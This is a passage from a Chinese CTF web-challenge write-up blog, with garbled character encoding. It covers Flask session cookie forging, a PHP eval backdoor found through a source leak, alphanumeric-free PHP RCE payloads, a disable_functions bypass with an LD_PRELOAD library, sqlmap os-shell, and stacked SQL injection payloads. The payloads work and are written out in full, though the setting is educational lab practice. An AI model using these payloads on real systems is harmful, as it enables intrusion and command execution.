<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717122643018.png" alt="image-20240717122643018"></p>
<h3 id="é™„ï¼šFlask-Session-Cookie-ç®¡ç†å™¨ä½¿ç”¨æŒ‡å—-1"><a href="#é™„ï¼šFlask-Session-Cookie-ç®¡ç†å™¨ä½¿ç”¨æŒ‡å—-1" class="headerlink" title="é™„ï¼šFlask Session Cookie ç®¡ç†å™¨ä½¿ç”¨æŒ‡å—"></a>é™„ï¼šFlask Session Cookie ç®¡ç†å™¨ä½¿ç”¨æŒ‡å—</h3><p><strong>ä½¿ç”¨è¯´æ˜</strong></p>
<ul>
<li>ä½¿ç”¨ <code>flask_session_cookie_manager3.py</code> ä¸ Python 3ï¼Œ<code>flask_session_cookie_manager2.py</code> ä¸ Python 2ã€‚</li>
</ul>
<p><strong>ä½¿ç”¨æ–¹æ³•ï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask_session_cookie_manager&#123;2,3&#125;.py [-h] &#123;encode,decode&#125; ...</span><br></pre></td></tr></table></figure>

<p><strong>Flask Session Cookie è§£ç &#x2F;ç¼–ç å·¥å…·</strong></p>
<p><strong>ä½ç½®å‚æ•°ï¼š</strong></p>
<ul>
<li><strong><code>&#123;encode,decode&#125;</code>:</strong> å­å‘½ä»¤å¸®åŠ©<ul>
<li><strong><code>encode</code>:</strong> ç¼–ç </li>
<li><strong><code>decode</code>:</strong> è§£ç </li>
</ul>
</li>
</ul>
<p><strong>å¯é€‰å‚æ•°ï¼š</strong></p>
<ul>
<li><strong><code>-h</code> æˆ– <code>--help</code>:</strong> æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º</li>
</ul>
<p><strong>ç¼–ç </strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;</span><br></pre></td></tr></table></figure>

<p><strong>å¯é€‰å‚æ•°ï¼š</strong></p>
<ul>
<li><strong><code>-h</code> æˆ– <code>--help</code>:</strong> æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º</li>
<li><strong><code>-s &lt;string&gt;</code> æˆ– <code>--secret-key &lt;string&gt;</code>:</strong>  å¯†é’¥</li>
<li><strong><code>-t &lt;string&gt;</code> æˆ– <code>--cookie-structure &lt;string&gt;</code>:</strong>  Session Cookie ç»“æ„</li>
</ul>
<p><strong>è§£ç </strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask_session_cookie_manager&#123;2,3&#125;.py decode [-h] [-s &lt;string&gt;] -c &lt;string&gt;</span><br></pre></td></tr></table></figure>

<p><strong>å¯é€‰å‚æ•°ï¼š</strong></p>
<ul>
<li><strong><code>-h</code> æˆ– <code>--help</code>:</strong> æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º</li>
<li><strong><code>-s &lt;string&gt;</code> æˆ– <code>--secret-key &lt;string&gt;</code>:</strong>  å¯†é’¥</li>
<li><strong><code>-c &lt;string&gt;</code> æˆ– <code>--cookie-value &lt;string&gt;</code>:</strong> Session Cookie å€¼</li>
</ul>
<p><strong>ç¤ºä¾‹</strong></p>
<p><strong>ç¼–ç </strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s <span class="string">&#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span> -t <span class="string">&#x27;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br><span class="line">eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw</span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„ï¼š</strong> Session Cookie ç»“æ„å¿…é¡»æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ Python å­—å…¸</p>
<p><strong>è§£ç </strong></p>
<p><strong>ä½¿ç”¨å¯†é’¥ï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c <span class="string">&#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span> -s <span class="string">&#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span></span><br><span class="line">&#123;u<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, u<span class="string">&#x27;number&#x27;</span>: <span class="string">&#x27;326410031505&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ä¸ä½¿ç”¨å¯†é’¥ (è¾“å‡ºæ ¼å¼è¾ƒå·®)ï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c <span class="string">&#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;number&quot;</span>:&#123;<span class="string">&quot; b&quot;</span>:<span class="string">&quot;MzI2NDEwMDMxNTA1&quot;</span>&#125;,<span class="string">&quot;username&quot;</span>:&#123;<span class="string">&quot; b&quot;</span>:<span class="string">&quot;YWRtaW4=&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="FSCTF-2023-ç­¾åˆ°plus-1"><a href="#FSCTF-2023-ç­¾åˆ°plus-1" class="headerlink" title="[FSCTF 2023]ç­¾åˆ°plus"></a>[FSCTF 2023]ç­¾åˆ°plus</h2><p>dirsearchæ‰«åˆ°shell.phpï¼Œè®¿é—®å‘ç°æ˜¯php info </p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717135734930.png" alt="image-20240717135734930"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46203060/article/details/129350280">PHPï¼œ&#x3D;7.4.21 Development Serveræºç æ³„éœ²æ¼æ´_php7.4.21æ¼æ´-CSDNåšå®¢</a></p>
<p>å…³é—­bpçš„Content-LengthåŠŸèƒ½</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717140053098.png" alt="image-20240717140053098"></p>
<p>è¯·æ±‚åŒ…åªç•™è¿™å‡ å¥å³å¯</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717140347431.png" alt="image-20240717140347431"></p>
<p>ä¿å­˜è‡³txtæŸ¥çœ‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">0.9</span> <span class="number">200</span> OK</span><br><span class="line">Host: node4.anna.nssctf.cn:<span class="number">28393</span></span><br><span class="line">Date: Wed, <span class="number">17</span> Jul <span class="number">2024</span> <span class="number">06</span>:<span class="number">03</span>:<span class="number">28</span> GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">443</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">$ğŸ˜€=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">$ğŸ˜=<span class="string">&quot;b&quot;</span>;</span><br><span class="line">$ğŸ˜‚=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">$ğŸ¤£=<span class="string">&quot;d&quot;</span>;</span><br><span class="line">$ğŸ˜ƒ=<span class="string">&quot;e&quot;</span>;</span><br><span class="line">$ğŸ˜„=<span class="string">&quot;f&quot;</span>;</span><br><span class="line">$ğŸ˜…=<span class="string">&quot;g&quot;</span>;</span><br><span class="line">$ğŸ˜†=<span class="string">&quot;h&quot;</span>;</span><br><span class="line">$ğŸ˜‰=<span class="string">&quot;i&quot;</span>;</span><br><span class="line">$ğŸ˜Š=<span class="string">&quot;j&quot;</span>;</span><br><span class="line">$ğŸ˜‹=<span class="string">&quot;k&quot;</span>;</span><br><span class="line">$ğŸ˜=<span class="string">&quot;l&quot;</span>;</span><br><span class="line">$ğŸ˜=<span class="string">&quot;m&quot;</span>;</span><br><span class="line">$ğŸ˜˜=<span class="string">&quot;n&quot;</span>;</span><br><span class="line">$ğŸ˜—=<span class="string">&quot;o&quot;</span>;</span><br><span class="line">$ğŸ˜™=<span class="string">&quot;p&quot;</span>;</span><br><span class="line">$ğŸ˜š=<span class="string">&quot;q&quot;</span>;</span><br><span class="line">$ğŸ™‚=<span class="string">&quot;r&quot;</span>;</span><br><span class="line">$ğŸ¤—=<span class="string">&quot;s&quot;</span>;</span><br><span class="line">$ğŸ¤©=<span class="string">&quot;t&quot;</span>;</span><br><span class="line">$ğŸ¤”=<span class="string">&quot;u&quot;</span>;</span><br><span class="line">$ğŸ¤¨=<span class="string">&quot;v&quot;</span>;</span><br><span class="line">$ğŸ˜=<span class="string">&quot;w&quot;</span>;</span><br><span class="line">$ğŸ˜‘=<span class="string">&quot;x&quot;</span>;</span><br><span class="line">$ğŸ˜¶=<span class="string">&quot;y&quot;</span>;</span><br><span class="line">$ğŸ™„=<span class="string">&quot;z&quot;</span>;</span><br><span class="line"></span><br><span class="line">$ğŸ˜­ = $ğŸ˜™. $ğŸ˜€. $ğŸ¤—. $ğŸ¤—. $ğŸ¤©. $ğŸ˜†. $ğŸ™‚. $ğŸ¤”;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ğŸ‘½ğŸ¦&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($ğŸ˜­(<span class="variable">$_GET</span>[<span class="string">&#x27;ğŸ‘½ğŸ¦&#x27;</span>]));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å‘½ä»¤æ‰§è¡Œå³å¯</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240717140821697.png" alt="image-20240717140821697"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717140853901.png" alt="image-20240717140853901"></p>
<h2 id="HNCTF-2022-Week1-Challenge-rce-1"><a href="#HNCTF-2022-Week1-Challenge-rce-1" class="headerlink" title="[HNCTF 2022 Week1]Challenge__rce"></a>[HNCTF 2022 Week1]Challenge__rce</h2><p>getä¼ å‚hintå¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$rce</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$rce</span>) &lt;= <span class="number">120</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$rce</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;Are you hack me?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I want string!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too long!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€é“æ— å‚RCEï¼Œå‘ç°|å’Œ^è¢«è¿‡æ»¤ï¼Œä¸èƒ½ç”¨å¼‚æˆ–</p>
<p>æŸ¥çœ‹æ‰€æœ‰æœªè¢«è¿‡æ»¤çš„å­—ç¬¦</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">regex = <span class="string">r&quot;[/!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]&quot;</span></span><br><span class="line"></span><br><span class="line">printable_chars = <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> printable_chars:</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> re.search(regex, <span class="built_in">chr</span>(char)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(char), end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717141939712.png" alt="image-20240717141939712"></p>
<p>è€ƒè™‘ä½¿ç”¨è‡ªå¢</p>
<p>é¦–å…ˆï¼Œåœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸º<code>Array</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_</span>); <span class="comment">//Array</span></span><br></pre></td></tr></table></figure>

<p>åŸºç¡€è¯­æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="variable">$_</span> = [].<span class="string">&#x27;&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$_</span>[<span class="number">0</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$___</span>= <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//P</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//P</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$___</span>;<span class="comment">//PO</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>;<span class="comment">//POS</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>;<span class="comment">//POST</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$__</span>[<span class="string">&#x27;_&#x27;</span>](<span class="variable">$$__</span>[<span class="string">&#x27;__&#x27;</span>]);</span><br><span class="line"><span class="comment">//$&#123;$__&#125;æœ€ç»ˆè§£æä¸º$_POST</span></span><br><span class="line"><span class="comment">//[&#x27;_&#x27;]å’Œ[&#x27;__&#x27;]æ˜¯ä¼ å…¥çš„å€¼</span></span><br><span class="line"></span><br><span class="line">rce = <span class="variable">$_</span>=%<span class="number">5</span>B%<span class="number">5</span>D.<span class="string">&#x27;&#x27;</span>;<span class="variable">$_</span>%<span class="number">20</span>=%<span class="number">20</span><span class="variable">$_</span>%<span class="number">5</span>B0%<span class="number">5</span>D;<span class="variable">$___</span>=%<span class="number">20</span><span class="string">&#x27;_&#x27;</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$___</span>%<span class="number">20</span>=%<span class="number">20</span><span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>.=<span class="variable">$___</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$__</span>.=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$__</span>.=<span class="variable">$_</span>;<span class="keyword">echo</span>%<span class="number">20</span><span class="variable">$__</span>;<span class="variable">$$__</span>%<span class="number">5</span>B<span class="string">&#x27;_&#x27;</span>%<span class="number">5</span>D(<span class="variable">$$__</span>%<span class="number">5</span>B<span class="string">&#x27;__&#x27;</span>%<span class="number">5</span>D);&amp;_=system&amp;__=ls</span><br><span class="line"><span class="comment">//è¿‡ä¸€éurlç¼–ç ï¼Œå¹¶ä¼ å…¥systemå’Œlsä¸¤ä¸ªå‚æ•°</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717150716468.png" alt="image-20240717150716468"></p>
<p>å¾—å°è¯•ç¼©å‡ï¼Œä½¿ç”¨CHr</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717151653606.png" alt="image-20240717151653606"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]._;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[<span class="number">1</span>];<span class="comment">//r</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//B</span></span><br><span class="line"><span class="variable">$_1</span>=++<span class="variable">$_</span>;<span class="comment">//C</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//D</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//F</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_1</span>.++<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">//CHr</span></span><br><span class="line"><span class="comment">// echo $_(71);</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>(<span class="number">71</span>).<span class="variable">$_</span>(<span class="number">69</span>).<span class="variable">$_</span>(<span class="number">84</span>); <span class="comment">//åˆ©ç”¨CHræ‹¼æ¥ è®©$_=_GET</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">1</span>](<span class="variable">$$_</span>[<span class="number">2</span>]); <span class="comment">//$_GET[1]($_GET[2])</span></span><br></pre></td></tr></table></figure>

<p>urlç¼–ç </p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717152317171.png" alt="image-20240717152317171"></p>
<p>ç„¶åå°±ã€‚ã€‚ã€‚</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717152446580.png" alt="image-20240717152446580"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717152503567.png" alt="image-20240717152503567"></p>
<h2 id="CISCN-2023-è¥¿å—-do-you-like-read-1"><a href="#CISCN-2023-è¥¿å—-do-you-like-read-1" class="headerlink" title="[CISCN 2023 è¥¿å—]do_you_like_read"></a>[CISCN 2023 è¥¿å—]do_you_like_read</h2><p>è§£æ³•ä¸€ï¼š</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718092743965.png" alt="image-20240718092743965"></p>
<p>å‘ç°å­˜åœ¨åé¢å¹¶ä¸”æœ‰ä¸ä¹‹å¯¹åº”çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718092819389.png" alt="image-20240718092819389"></p>
<p>å¯¹ç€åé—¨æ–‡ä»¶æ”¹è·¯å¾„å³å¯</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718093332120.png" alt="image-20240718093332120">&#x2F;var&#x2F;wwwç›®å½•æ— å›æ˜¾å¯ä»¥è€ƒè™‘appç›®å½•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28157/bootstrap/test/bypass_disablefunc.php?cmd=env&amp;outpath=/tmp/xx&amp;sopath=/app/bootstrap/test/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718093403071.png" alt="image-20240718093403071"></p>
<p>è§£æ³•äºŒï¼š</p>
<p>å°†phpç­‰åç¼€æ”¹æˆjpgç»“å°¾</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718093739882.png" alt="image-20240718093739882"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718093830548.png" alt="image-20240718093830548"></p>
<p>æ ¹æ®æºç ä¸­çš„è·¯å¾„ç›´æ¥å°è¯•è®¿é—®webshell</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718093950170.png" alt="image-20240718093950170"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718094058734.png" alt="image-20240718094058734"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718094128030.png" alt="image-20240718094128030"></p>
<p>è§£æ³•ä¸‰ï¼š</p>
<p>å‘ç°å¯èƒ½å­˜åœ¨sqlæ³¨å…¥çš„æ¼æ´ç‚¹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718094554591.png" alt="image-20240718094554591"></p>
<p>ç›´æ¥è·‘sqlmap</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718094549834.png" alt="image-20240718094549834"></p>
<p>â€“os-shellç›´æ¥çœ‹ç¯å¢ƒå˜é‡å³å¯</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718094644388.png" alt="image-20240718094644388"></p>
<h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨-1"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨-1" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>è”åˆæŸ¥è¯¢çš„æ—¶å€™å‘ç°å­˜åœ¨è¿‡æ»¤</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240718102729369.png" alt="image-20240718102729369"></p>
<ul>
<li>ç»•è¿‡å§¿åŠ¿1ï¼šåå…­è¿›åˆ¶ç¼–ç ç»•è¿‡</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ç»•è¿‡å§¿åŠ¿2ï¼šä½¿ç”¨handlerå‡½æ•°æ›¿æ¢</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æ‰“å¼€ä¸€ä¸ªè¡¨çš„handler</span></span><br><span class="line">HANDLER table_name <span class="keyword">OPEN</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- è¯»å–ä¸‹ä¸€ä¸ªç´¢å¼•æ¡ç›®</span></span><br><span class="line">HANDLER table_name READ NEXT;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å…³é—­handler</span></span><br><span class="line">HANDLER table_name <span class="keyword">CLOSE</span>;</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read next;</span></span><br></pre></td></tr></table></figure>

<h2 id="é¹¤åŸæ¯-2021-EasyP-1"><a href="#é¹¤åŸæ¯-2021-EasyP-1" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h2><p>æºç </p>
